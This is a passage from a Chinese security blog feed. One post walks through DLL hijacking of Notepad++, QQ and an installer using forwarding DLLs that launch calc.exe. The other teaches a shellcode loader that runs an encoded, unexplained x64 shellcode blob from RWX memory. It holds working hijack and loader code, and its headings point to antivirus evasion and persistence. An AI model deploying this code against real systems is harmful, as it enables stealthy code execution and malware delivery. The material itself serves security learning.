alt="image-20220228172005462"></p><p><img src="http://cdn.polowong.top/image-20220228172024684.png" alt="image-20220228172024684"></p><p>发现存在loadLibraryEx，尝试劫持该dll</p><p>使用工具CFF explorer查看该DLL的输出函数，输出函数是可以被外部访问的，就像刚才写的demo一样</p><p><img src="http://cdn.polowong.top/image-20220228172552154.png" alt="image-20220228172552154"></p><p>编写dll文件内容如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">Scintilla_DirectFunction</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">( HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">                       DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">                       LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">                     )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Scintilla_DirectFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>生成DLL改名为SciLexer.dll并放到notepad++根目录并尝试运行</p><p><img src="http://cdn.polowong.top/image-20220228172839478.png" alt="image-20220228172839478"></p><p>发现报错了，感觉是dll中有些内容是必须实现的，但是我们不知道其内容是什么，所以考虑其他方法劫持该dll</p><p>下面使用dll转发的方式劫持该dll</p><p>dll文件代码如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> __declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">Scintilla_DirectFunction</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD  ul_reason_for_call,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">switch</span></span> (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        <span class="built_in">system</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Scintilla_DirectFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HINSTANCE hDll = <span class="built_in">LoadLibrary</span>(<span class="string">L&quot;SciLexer_re.dll&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (hDll)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//typedef 是定义了一个新的类型</span></span><br><span class="line">        <span class="comment">//DWORD是双字类型 4个字节,API函数中有很多参数和返回值是DWORD</span></span><br><span class="line">        <span class="comment">//定义了类型EXPFUNC，并且返回类型是DWORD的函数的指针</span></span><br><span class="line">        <span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(WINAPI* EXPFUNC)</span><span class="params">()</span></span>;</span><br><span class="line">        EXPFUNC expFunc = <span class="literal">NULL</span>;</span><br><span class="line">        expFunc = (EXPFUNC)<span class="built_in">GetProcAddress</span>(hDll, <span class="string">&quot;Scintilla_DirectFunction&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (expFunc)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">expFunc</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将原始dll文件SciLexer.dll改名为SciLexer_re.dll，将该文件改名为SciLexer.dll并放到notepad++.exe的目录下，该dll起了转发的作用，调用顺序为exe-&gt;SciLexer.dll-&gt;SciLexer_re.dll</p><p><strong>需要注意的是，本次测试环境vs2019配置release x86生成的dll才能正常运行，猜测notepad++为32位。</strong></p><p><img src="http://cdn.polowong.top/image-20220228214429289.png" alt="image-20220228214429289"></p><p>运行notepad.exe即可弹出计算器，但是无法正常运行notepad.exe</p><p><img src="http://cdn.polowong.top/image-20220228214502134.png" alt="image-20220228214502134"></p><h2 id="直接转发劫持QQ"><a href="#直接转发劫持QQ" class="headerlink" title="直接转发劫持QQ"></a>直接转发劫持QQ</h2><p>这里还是使用导入表进行劫持，首先用cff(下载地址:[<a href="https://ntcore.com/files/CFF_Explorer.zip]">https://ntcore.com/files/CFF_Explorer.zip]</a>) 打开QQ.exe的导入表，找一个不在<code>HKEY_LOCAL_MACHINE/SYSTEM/CurrentControlSet/Control/Session) Manager\KnownDLLs</code>路径里面的dll进行劫持，因为在这个路径里面的dll是优先加载的，加载之后已经进入内核空间，想要劫持难度很大。这里我选择的是<code>libuv.dll</code>进行劫持</p><p><img src="http://cdn.polowong.top/image-20220228213308186.png" alt="image-20220228213308186"></p><p>使用aheadlib生成cpp文件并放到vscode的dll项目中，代码如下，记住libuvOrg这个名字，后面要用。</p><p><img src="http://cdn.polowong.top/image-20220228213801554.png" alt="image-20220228213801554"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 头文件</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="comment">// 导出函数</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/EXPORT:uv_accept=libuvOrg.uv_accept,@1&quot;</span>)</span></span><br><span class="line"><span class="comment">// 获取原始函数地址</span></span><br><span class="line"><span class="function">FARPROC WINAPI <span class="title">GetAddress</span><span class="params">(PCSTR pszProcName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/EXPORT:uv_accept=libuvOrg.uv_accept,@1&quot;</span>)</span></span><br><span class="line"><span class="comment">//代码很长，我去了大部分#pragma comment(linker, &quot;/EXPORT:uv_accept=libuvOrg.uv_accept,@1&quot;)形式的自动生成的代码</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 入口函数</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HMODULE hModule, DWORD dwReason, PVOID pvReserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">DisableThreadLibraryCalls</span>(hModule);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (dwReason == DLL_PROCESS_DETACH)</span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>采用release x86编译生成dll文件</strong>，将生成的dll文件命名位libuv.dll并放到原dll目录下，将原dll文件命名为libuvOrg.dll，双击qq.exe即可弹出计算器</p><p><img src="http://cdn.polowong.top/image-20220228213922826.png" alt="image-20220228213922826"></p><p><img src="http://cdn.polowong.top/image-20220228214207103.png" alt="image-20220228214207103"></p><h2 id="即时调用劫持QQ"><a href="#即时调用劫持QQ" class="headerlink" title="即时调用劫持QQ"></a>即时调用劫持QQ</h2><p>todo，一直报错，麻了。</p><h2 id="劫持不存在的dll–音速启动"><a href="#劫持不存在的dll–音速启动" class="headerlink" title="劫持不存在的dll–音速启动"></a>劫持不存在的dll–音速启动</h2><p>音速启动V5安装程序，打开procmon过滤进程名和NAME NOT FOUND：</p><p><img src="http://cdn.polowong.top/image-20220301202140714.png" alt="image-20220301202140714"></p><p>发现音速启动在当前安装目录尝试加载DLL，打开一些NOT FOUND 的dll调用栈看一下</p><p><img src="http://cdn.polowong.top/image-20220301202437109.png" alt="image-20220301202437109"></p><p>尝试劫持，将上文生成的dll hijack demo改名为SHFOLDER.dll并放至与安装文件同目录</p><p>再次运行安装文件，即可弹出计算器</p><p><img src="http://cdn.polowong.top/image-20220301202529573.png" alt="image-20220301202529573"></p><h1 id="自动化DLL劫持检测工具–Rattler"><a href="#自动化DLL劫持检测工具–Rattler" class="headerlink" title="自动化DLL劫持检测工具–Rattler"></a>自动化DLL劫持检测工具–Rattler</h1><p>github地址：<a href="https://github.com/sensepost/rattler/releases/tag/v1.0">https://github.com/sensepost/rattler/releases/tag/v1.0</a></p><p>使用时需要注意，要根据程序是64位还是32位选择Rattler版本，否则识别失败。</p><p><img src="http://cdn.polowong.top/image-20220301221252204.png" alt="image-20220301221252204"></p><p>使用Rattler建议的DLL文件尝试劫持</p><p><img src="http://cdn.polowong.top/image-20220301221509251.png" alt="image-20220301221509251"></p><p>将生成的CRYPTBASE.DLL放到应用根目录，可以看到成功弹出了计算器</p><p><img src="http://cdn.polowong.top/image-20220301221540672.png" alt="image-20220301221540672"></p><p><img src="http://cdn.polowong.top/image-20220301221608661.png" alt="image-20220301221608661"></p><h1 id="红队武器化"><a href="#红队武器化" class="headerlink" title="红队武器化"></a>红队武器化</h1><p>todo，<a href="https://www.anquanke.com/post/id/232891">https://www.anquanke.com/post/id/232891</a></p><h2 id="白加黑免杀实现"><a href="#白加黑免杀实现" class="headerlink" title="白加黑免杀实现"></a>白加黑免杀实现</h2><h2 id="权限维持实现"><a href="#权限维持实现" class="headerlink" title="权限维持实现"></a>权限维持实现</h2><h1 id="DLL劫持防御及实例"><a href="#DLL劫持防御及实例" class="headerlink" title="DLL劫持防御及实例"></a>DLL劫持防御及实例</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://www.anquanke.com/post/id/232891">https://www.anquanke.com/post/id/232891</a></p><p><a href="https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/">https://skewwg.github.io/2020/11/26/diao-yu-yu-she-gong-xi-lie-zhi-dll-jie-chi/</a></p><p><a href="https://drunkmars.top/2021/10/03/dll%E5%8A%AB%E6%8C%81/">https://drunkmars.top/2021/10/03/dll%E5%8A%AB%E6%8C%81/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;什么是DLL&quot;&gt;&lt;a href=&quot;#什么是DLL&quot; class=&quot;headerlink&quot; title=&quot;什么是DLL&quot;&gt;&lt;/a&gt;什么是DLL&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>免杀基础之认识shellcode加载器</title>
    <link href="https://polosec.github.io/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%AE%A4%E8%AF%86shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/"/>
    <id>https://polosec.github.io/2022/01/15/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80%E4%B9%8B%E8%AE%A4%E8%AF%86shellcode%E5%8A%A0%E8%BD%BD%E5%99%A8/</id>
    <published>2022-01-15T09:37:24.000Z</published>
    <updated>2022-01-15T09:37:24.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="认识shellcode加载器"><a href="#认识shellcode加载器" class="headerlink" title="认识shellcode加载器"></a>认识shellcode加载器</h1><p>下面是一个最简单的shellcode加载器，目的是将shellcode加载到内存中并执行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _CRT_SECURE_NO_DEPRECATE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Windows.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] =</span><br><span class="line">        <span class="string">&quot;\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff&quot;</span></span><br><span class="line">        <span class="string">&quot;\xff\xff\x48\xbb\xa2\xd8\x0e\xfe\xd3\xcd\x9c\xae\x48\x31\x58&quot;</span></span><br><span class="line">        <span class="string">&quot;\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x5e\x90\x8d\x1a\x23\x25&quot;</span></span><br><span class="line">        <span class="string">&quot;\x5c\xae\xa2\xd8\x4f\xaf\x92\x9d\xce\xff\xf4\x90\x3f\x2c\xb6&quot;</span></span><br><span class="line">        <span class="string">&quot;\x85\x17\xfc\xc2\x90\x85\xac\xcb\x85\x17\xfc\x82\x90\x85\x8c&quot;</span></span><br><span class="line">        <span class="string">&quot;\x83\x85\x93\x19\xe8\x92\x43\xcf\x1a\x85\xad\x6e\x0e\xe4\x6f&quot;</span></span><br><span class="line">        <span class="string">&quot;\x82\xd1\xe1\xbc\xef\x63\x11\x03\xbf\xd2\x0c\x7e\x43\xf0\x99&quot;</span></span><br><span class="line">        <span class="string">&quot;\x5f\xb6\x58\x9f\xbc\x25\xe0\xe4\x46\xff\x03\x46\x1c\x26\xa2&quot;</span></span><br><span class="line">        <span class="string">&quot;\xd8\x0e\xb6\x56\x0d\xe8\xc9\xea\xd9\xde\xae\x58\x85\x84\xea&quot;</span></span><br><span class="line">        <span class="string">&quot;\x29\x98\x2e\xb7\xd2\x1d\x7f\xf8\xea\x27\xc7\xbf\x58\xf9\x14&quot;</span></span><br><span class="line">        <span class="string">&quot;\xe6\xa3\x0e\x43\xcf\x1a\x85\xad\x6e\x0e\x99\xcf\x37\xde\x8c&quot;</span></span><br><span class="line">        <span class="string">&quot;\x9d\x6f\x9a\x38\x7b\x0f\x9f\xce\xd0\x8a\xaa\x9d\x37\x2f\xa6&quot;</span></span><br><span class="line">        <span class="string">&quot;\x15\xc4\xea\x29\x98\x2a\xb7\xd2\x1d\xfa\xef\x29\xd4\x46\xba&quot;</span></span><br><span class="line">        <span class="string">&quot;\x58\x8d\x80\xe7\xa3\x08\x4f\x75\xd7\x45\xd4\xaf\x72\x99\x56&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\x8b\x93\xc5\xf4\xe3\x80\x4f\xa7\x92\x97\xd4\x2d\x4e\xf8&quot;</span></span><br><span class="line">        <span class="string">&quot;\x4f\xac\x2c\x2d\xc4\xef\xfb\x82\x46\x75\xc1\x24\xcb\x51\x5d&quot;</span></span><br><span class="line">        <span class="string">&quot;\x27\x53\xb7\x6d\xba\xef\x9c\xfd\xeb\x3c\xfe\xd3\x8c\xca\xe7&quot;</span></span><br><span class="line">        <span class="string">&quot;\x2b\x3e\x46\x7f\x3f\x6d\x9d\xae\xa2\x91\x87\x1b\x9a\x71\x9e&quot;</span></span><br><span class="line">        <span class="string">&quot;\xae\xa3\x63\xce\x56\x7d\xce\xdd\xfa\xeb\x51\xea\xb2\x5a\x3c&quot;</span></span><br><span class="line">        <span class="string">&quot;\xdd\x14\xee\xaf\x28\xf9\x2c\x18\xd0\x27\x48\xb0\x0f\xff\xd3&quot;</span></span><br><span class="line">        <span class="string">&quot;\xcd\xc5\xef\x18\xf1\x8e\x95\xd3\x32\x49\xfe\xf2\x95\x3f\x37&quot;</span></span><br><span class="line">        <span class="string">&quot;\x9e\xfc\x5c\xe6\x5d\x18\x46\x77\x11\x85\x63\x6e\xea\x51\xcf&quot;</span></span><br><span class="line">        <span class="string">&quot;\xbf\x69\x27\x93\x71\x42\x27\xdb\xb6\x5a\x0a\xf6\xbe\xe3\x80&quot;</span></span><br><span class="line">        <span class="string">&quot;\x42\x77\x31\x85\x15\x57\xe3\x62\x97\x5b\xa7\xac\x63\x7b\xea&quot;</span></span><br><span class="line">        <span class="string">&quot;\x59\xca\xbe\xd1\xcd\x9c\xe7\x1a\xbb\x63\x9a\xd3\xcd\x9c\xae&quot;</span></span><br><span class="line">        <span class="string">&quot;\xa2\x99\x5e\xbf\x83\x85\x15\x4c\xf5\x8f\x59\xb3\xe2\x0d\xf6&quot;</span></span><br><span class="line">        <span class="string">&quot;\xa3\xfb\x99\x5e\x1c\x2f\xab\x5b\xea\x86\x8c\x0f\xff\x9b\x40&quot;</span></span><br><span class="line">        <span class="string">&quot;\xd8\x8a\xba\x1e\x0e\x96\x9b\x44\x7a\xf8\xf2\x99\x5e\xbf\x83&quot;</span></span><br><span class="line">        <span class="string">&quot;\x8c\xcc\xe7\x5d\x18\x4f\xae\x9a\x32\x54\xe3\x2b\x19\x42\x77&quot;</span></span><br><span class="line">        <span class="string">&quot;\x12\x8c\x26\xd7\x6e\xe7\x88\x01\x06\x85\xad\x7c\xea\x27\xc4&quot;</span></span><br><span class="line">        <span class="string">&quot;\x75\xdd\x8c\x26\xa6\x25\xc5\x6e\x01\x06\x76\x6c\x1b\x00\x8e&quot;</span></span><br><span class="line">        <span class="string">&quot;\x4f\x44\x75\x58\x21\x33\x5d\x0d\x46\x7d\x17\xe5\xa0\xa8\xde&quot;</span></span><br><span class="line">        <span class="string">&quot;\xd2\x8e\x05\x33\xb8\x99\x15\xe5\xcb\x7c\x91\xb9\xcd\xc5\xef&quot;</span></span><br><span class="line">        <span class="string">&quot;\x2b\x02\xf1\x2b\xd3\xcd\x9c\xae&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* exec = <span class="built_in">VirtualAlloc</span>(<span class="number">0</span>, <span class="keyword">sizeof</span> buf, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(exec, buf, <span class="built_in"><span class="keyword">sizeof</span></span>(buf));</span><br><span class="line">    ((<span class="built_in"><span class="keyword">void</span></span>(*)())exec)();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中，VirtualAlloc()的作用是在虚拟内存空间中申请一块区域</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   VirtualAlloc(</span></span><br><span class="line"><span class="comment">       NULL, // 基址</span></span><br><span class="line"><span class="comment">       800,  // 大小</span></span><br><span class="line"><span class="comment">       MEM_COMMIT, // 内存页状态</span></span><br><span class="line"><span class="comment">       PAGE_EXECUTE_READWRITE // 可读可写可执行</span></span><br><span class="line"><span class="comment">       );</span></span><br><span class="line"><span class="comment">   */</span></span><br></pre></td></tr></table></figure><p><strong>void *memcpy(void *str1, const void *str2, size_t n)</strong> 从存储区 <strong>str2</strong> 复制 <strong>n</strong> 个字节到存储区 <strong>str1</strong>,在上述实例中是将buf复制到exec中，大小为sizeof(buf)</p><p>下面这句话比较关键，</p><p>((void(*)())exec)()</p><p>理解这句话首先要回顾c语言相关知识，*p代表一个指针，指针指向某个函数的地址，而*p()则代表了调用p所指向的函数。</p><p>标准的调用方法为(*p)(),简写为<strong>p()</strong></p><p>示例如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Max</span><span class="params">(<span class="keyword">int</span>, <span class="keyword">int</span>)</span></span>;  <span class="comment">//函数声明</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in"><span class="keyword">int</span></span> (*p)(<span class="keyword">int</span>, <span class="keyword">int</span>);  <span class="comment">//定义一个函数指针</span></span><br><span class="line">    <span class="keyword">int</span> a, b, c,d;</span><br><span class="line">    p = Max;  <span class="comment">//把函数Max赋给指针变量p, 使p指向Max函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;please enter a and b:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;a, &amp;b);</span><br><span class="line"></span><br><span class="line">    c = <span class="built_in">p</span>(a, b);    <span class="comment">// 通过函数指针调用Max函数</span></span><br><span class="line">    d = (*p)(a, b); <span class="comment">// 这样调用也行</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a = %d\nb = %d\nmax = %d,%d\n&quot;</span>, a, b, c,d);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Max</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span>  <span class="comment">//定义Max函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> z;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; y)</span><br><span class="line">    &#123;</span><br><span class="line">        z = x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        z = y;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">please enter a and b:3 4</span><br><span class="line">a &#x3D; 3</span><br><span class="line">b &#x3D; 4</span><br><span class="line">max &#x3D; 4</span><br></pre></td></tr></table></figure><p>在上述代码中定义了int型的指针p，p指向一个函数，该函数接受两个int型的参数</p><p>如果p是指向返回类型为void的函数的指针，那么p的声明应该类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void (*p)();</span><br></pre></td></tr></table></figure><p>在c语言的类型转换中，如果想把float类型转为int型的话，强制类型转换方法如下：</p><p>float a=1.1;</p><p>float b=(int)a;</p><p>虽然上述例子与int b=a;的结果一致，但上述例子突出了使用强制类型转换：把变量a从float类型专为了int类型，那么我们可以得到类型转换的方法为在变量前面加**(type)<strong>，这里的</strong>type<strong>就是</strong>int**,即**(int)<strong>,我们从变量声明的int a;到类型转换的(int) a 的区别为：去掉</strong>变量名**与分号，并将剩余部分括起来，就得到了int型的强制类型转换方法。</p><p>如果我们想得到一个void类型的函数的指针应该怎么做？</p><p>上面提到的 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void (*p)();</span><br></pre></td></tr></table></figure><p>是一个void类型的函数指针p的<strong>变量声明</strong>，根据上述规则，强制转换方法为**(void (<em>)())**,即我们可以在某变量前面添加*</em>(void (*)())**将其强制转换为返回值为空的指向函数的指针类型。</p><p>现在再把下面的代码拆开理解：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(    (void(*)())    exec    )()；</span><br></pre></td></tr></table></figure><p><strong>(void(<em>)())<strong>代表将exec转为返回值为空的指针类型，</strong>(    (void(</em>)())    exec    )()<strong>和</strong>(   * (void(*)())    exec    )()<strong>等价，都是代表调用返回值类型为</strong>void</strong>的<strong>函数指针exec</strong>所指向的函数.</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a 